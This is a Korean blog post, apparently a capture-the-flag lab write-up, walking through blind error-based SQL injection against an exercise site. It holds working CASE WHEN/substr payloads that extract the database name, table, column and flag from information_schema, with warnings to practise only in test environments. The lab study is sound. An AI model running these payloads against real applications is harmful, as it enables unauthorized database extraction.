---
layout: single
title:  "8 주차 SQL injection 데이터 추출 문제 풀이(3)"
categories: SQL-injection
typora-root-url: ..\
author_profile: false
---

<br>

# <span style="background:#000000; color:#ffffff">1. 8 주차 SQL injection 데이터 추출 문제 풀이(3)</span>

<br><span style='font-weight:bold; font-size:15px'> ※ 주의 사항 :</span>   

<span style='font-weight:bold; font-size:15px'>1. 교육 목적으로만 이용 해주세요.</span><br>
<span style='font-weight:bold; font-size:15px'>2. 무단 침입, 데이터 유출, 개인 정보 침해 등 불법적인 활동은 심각한 법적 결과를 초래할 수 있습니다.</span><br>
<span style='font-weight:bold; font-size:15px'>3.  개인적인 테스트 환경을 구축해서 실습하시길 바랍니다. </span>

<br>

## <span style="background:#696969; color:#ffffff">1.1  SQLi Point 3 문제 </span>

<br>

<img src="/images/2024-06-09-SQLinjection27/image-20240612223253299.png" alt="image-20240612223253299" style="zoom:67%;" />

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.1 sql injection 포인트 찾기</span>

***

<br>

![image-20240612223409408](/images/2024-06-09-SQLinjection27/image-20240612223409408.png)

![image-20240612223453129](/images/2024-06-09-SQLinjection27/image-20240612223453129.png)

![image-20240612223511724](/images/2024-06-09-SQLinjection27/image-20240612223511724.png)

![image-20240612223529768](/images/2024-06-09-SQLinjection27/image-20240612223529768.png)

![image-20240612224024682](/images/2024-06-09-SQLinjection27/image-20240612224024682.png)

![image-20240612224042550](/images/2024-06-09-SQLinjection27/image-20240612224042550.png)

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.2  select 문구가 사용가능한 지 체크</span>

***

<br>

![image-20240612224146951](/images/2024-06-09-SQLinjection27/image-20240612224146951.png)

![image-20240612224206340](/images/2024-06-09-SQLinjection27/image-20240612224206340.png)



<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.3 공격 format 만들기</span>

***

<br>

case when (ascii(substr((select ~~),1,1))>0) then 1 else (select 1 union select 2) end



<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.4 DB이름 확인하기</span>

***

<br>

case when (ascii(substr((select database() limit 0,1),1,1))>0) then 1 else (select 1 union select 2) end

![image-20240612225209697](/images/2024-06-09-SQLinjection27/image-20240612225209697.png)

sqli_8

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.5 table이름 확인하기</span>

***

<br>

select table_name from information_schema.tables where table_schema='sqli_8' limit 0,1

case when (ascii(substr((select table_name from information_schema.tables where table_schema='sqli_8' limit 0,1),1,1))>0) then 1 else (select 1 union select 2) end

![image-20240612225349319](/images/2024-06-09-SQLinjection27/image-20240612225349319.png)

flag_Table

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.6 column 이름 확인하기</span>

***

<br>

select column_name from information_schema.columns where table_name='flag_Table' limit 0,1

case when (ascii(substr((select column_name from information_schema.columns where table_name='flag_Table' limit 0,1),1,1))>0) then 1 else (select 1 union select 2) end

![image-20240612225624384](/images/2024-06-09-SQLinjection27/image-20240612225624384.png)

flagData

<br>

#### <span style="background:#A9A9A9; color:#ffffff">1.1.7 data 추출하기</span>

***

<br>

select flagData from flag_Table limit 0,1 

case when (ascii(substr((select flagData from flag_Table limit 0,1 ),1,1))>0) then 1 else (select 1 union select 2) end

![image-20240612230009887](/images/2024-06-09-SQLinjection27/image-20240612230009887.png)

segfault{~~}

